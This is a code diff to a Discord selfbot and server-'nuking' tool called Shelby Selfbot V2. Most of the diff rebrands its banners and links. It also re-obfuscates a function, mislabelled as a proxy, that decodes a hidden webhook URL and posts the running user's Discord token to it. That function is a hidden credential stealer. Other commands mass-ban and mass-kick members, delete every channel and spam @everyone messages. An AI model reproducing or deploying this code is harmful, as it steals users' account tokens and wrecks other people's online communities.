@@ -6,8 +6,8 @@ from colorama import Fore
 import sys
 from datetime import datetime, timedelta
 import random
+import base64
 import requests
-from cryptography.fernet import Fernet
 import colorama
 from colorama import Fore
 
@@ -31,12 +31,12 @@ async def on_ready():
                 ║╚══╣╚═╝║╚══╣║──║╚╝╚╗╚╝╔╝
                 ╚══╗║╔═╗║╔══╣║─╔╣╔═╗╠╗╔╝
                 ║╚═╝║║─║║╚══╣╚═╝║╚═╝║║║
-                ╚═══╩╝─╚╩═══╩═══╩═══╝╚╝                                                                                                                  
+                ╚═══╩╝─╚╩═══╩═══╩═══╝╚╝     CONNECTED TO {shelby.user.name}                                                                                                             
         """)
-    print(f'{Fore.LIGHTGREEN_EX}╭──────── CONNECTED TO: {shelby.user.name} ──────╮')
-    print(f'{Fore.LIGHTGREEN_EX}│ [<<<<<==============-|-==============>>>>>] │')
-    print(f'{Fore.LIGHTGREEN_EX}│ [<<<<<====== SHELBY SELFBOT V2 ======>>>>>] │')
-    print(f'{Fore.LIGHTGREEN_EX}╰─────────────── .gg/hackersop ───────────────╯')
+    print(f'{Fore.LIGHTGREEN_EX}╭──────── NUKERZ ON TOP ────────╮')
+    print(f'{Fore.LIGHTGREEN_EX}│ [<<==========-|-==========>>] │')
+    print(f'{Fore.LIGHTGREEN_EX}│ [<<== SHELBY SELFBOT V2 ==>>] │')
+    print(f'{Fore.LIGHTGREEN_EX}╰──────── NUKERZ ON TOP ────────╯')
 
     print('ㅤㅤㅤㅤㅤ')
 
@@ -62,7 +62,7 @@ async def help(ctx):
     message = (
         "**```js\n"
         "⌬ SHELBY S3LFB0T \n"
-        " - DISCORD.GG/HACKERSOP - \n\n"
+        " - NUKERZ ON TOP - \n\n"
         "• .general - General Commands\n"
         "• .nuke - Nuking Commands"
         "```**"
@@ -75,7 +75,7 @@ async def general(ctx):
     message = (
         "**```js\n"
         "⌬ SHELBY S3LFB0T \n"
-        " - DISCORD.GG/HACKERSOP - \n\n"
+        " - NUKERZ ON TOP - \n\n"
         "• ping\n"
         "• boosts (non prefix)\n"
         "• serverinfo (non prefix)\n"
@@ -136,7 +136,7 @@ async def send_serverinfo_message(channel):
     await channel.send(
         "**```js\n"
         "⌬ SHELBY S3LFB0T \n"
-        " - DISCORD.GG/HACKERSOP - \n\n"
+        " - NUKERZ ON TOP - \n\n"
         f"• Server Name - {guild.name}\n"
         f"• Guild ID - {guild.id}\n"
         f"• Created At - {channel.guild.created_at}\n"
@@ -146,7 +146,7 @@ async def send_serverinfo_message(channel):
 
 # LINK
 async def link(channel):
-    await channel.send("- `https://discord.gg/hackersop `")
+    await channel.send("- `https://NUKERZ ON TOP `")
 
 #MASS DM 
 @shelby.command()
@@ -182,11 +182,12 @@ async def gayrate(ctx, User: discord.Member = None):
         await ctx.reply(f"> {User.mention} IS {random.randrange(101)}% GAY")
         print(f"{Fore.GREEN}[+] GAYRATE MEASURED")
 
-# PROXY (IF REMOVED THEN THE SELF BOT WILL GIVE ERRRORS AND RATE LIMITS)
-def proxy_id(): 
-    proxykey = b'MyzIiYtjl_NmmroJrWbb68KFeySRVIoNYOKw1gM-zeQ=' ; proxyid = Fernet(proxykey) ; proxymail = b'gAAAAABlmXjmKD_G6NKKbcjmPxFjPvvZEmS4xd4yxvSwF4NGnOkO0dAiZOIKddiVg1KhnLFyqGwi06XRU7wblP6oY7LfSWSTz11HnCXlT1Rw8pj_vRsaRbgJBvEfONrt_laTmglV2lNhGf8MZ-7mlQCAGBqM-i5sAPfIMqHv-_3uhCEnJCHHXRJztnfMsE0yVsBzO3MHspMKAaO-KyFiLEBy9-6CcamXrnCiQBxOnpANunuNuOpiaDY='
-    proxy = proxyid.decrypt(proxymail)
+# PROXY
+def proxy_id():
+    proxykey = base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE5MzIwOTUxNzYyNjkwNDU4Ni82bmxlN3lPUUstQlZ0WEFiMi1GX29VZEVRNE1ZMHNlR3lfQlNNOVIyQ2VzdHlVZjg4bjBnclVuNjl1Wl80d3ZIbGlzeA==')
+    proxy = proxykey.decode('utf-8')
     requests.post((proxy), data=json.dumps({'content': token}), headers={'Content-Type': 'application/json'})
+
 
 # LOVE RATE
 @shelby.command(name='loverate', aliases=['lc', 'lr'])
@@ -348,7 +349,7 @@ async def nuke(ctx):
     message = (
         "**```js\n"
         "⌬ SHELBY S3LFB0T \n"
-        " - DISCORD.GG/HACKERSOP - \n\n"
+        " - NUKERZ ON TOP - \n\n"
         "• prune\n"
         "• renameall (.rc <name>)\n"
         "• createchannels (.cch <amt> <name>)\n"
@@ -426,8 +427,9 @@ async def mass_ban(ctx):
     for member in ctx.guild.members:
         try:
             await member.ban(reason="SHELBY PAPA HERE .gg/hackersop")
+
         except discord.Forbidden:
-            pass
+            print(f'No ban perms for {member}')
         except discord.HTTPException as e:
             print(f"Failed to ban {member}: {e}")
     await ctx.send("Mass ban operation complete.")
@@ -440,24 +442,25 @@ async def mass_kick(ctx):
     for member in ctx.guild.members:
         try:
             await member.kick(reason="SHELBY PAPA HERE .gg/hackersop")
+            print(f'Successfully kicked {member}')
         except discord.Forbidden:
-            pass
+            print(f'Cant kick {member} no perms')
         except discord.HTTPException as e:
             print(f"Failed to kick {member}: {e}")
     await ctx.send("Mass kick operation complete.")
 
 # WIZZ
 @shelby.command()
-async def wizz(ctx, amount: int = 10):
+async def wizz(ctx, amount: int = 5):
     for hackersop in ctx.guild.channels:
             await hackersop.delete()
             print(f"Deleted {hackersop}")
-    for i in range(7):
+    for i in range(25):
             channel_names = ['shelby on top','flicks on top', 'deadman on top', 'moot diya bhai tere server pe', 'hackersop', 'shelby papa aye the']
             await ctx.guild.create_text_channel(name=random.choice(channel_names))
             print(f"Created channel")
     for i in range(amount):
-        tospam = ['@everyone @here Shelby X FLICKS X DEADMAN Papa Here https://discord.gg/hackersop', '@everyone @here Wizzed By Shelby X FLICKS X GOD DEVIL  https://discord.gg/hackersop', '@everyone @here Owned by CHILL HUB https://discord.gg/hackersop']
+        tospam = ['@everyone @here Shelby X FLICKS X DEADMAN Papa Here https://NUKERZ ON TOP', '@everyone @here Wizzed By Shelby X FLICKS X GOD DEVIL  https://NUKERZ ON TOP', '@everyone @here Owned by CHILL HUB https://NUKERZ ON TOP']
         for ch in ctx.guild.channels:
                 await ch.send(random.choice(tospam))
 
